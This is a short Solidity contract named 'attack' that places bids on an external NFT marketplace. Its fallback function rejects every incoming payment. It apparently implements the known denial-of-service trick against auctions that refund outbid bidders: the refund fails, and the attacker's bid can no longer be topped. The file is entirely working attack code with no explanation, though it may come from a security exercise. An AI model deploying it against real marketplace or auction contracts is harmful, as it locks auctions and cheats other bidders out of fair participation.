// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface marketPlace {
    function bid(uint256 nftId) external payable;
}

contract attack {
    marketPlace market;

    constructor(address _market) {
        market = marketPlace(_market);
    }

    function makeBid(uint256 nftId) public payable {
        market.bid{value: msg.value}(nftId);
    }

    fallback() external payable {
        revert();
    }
}
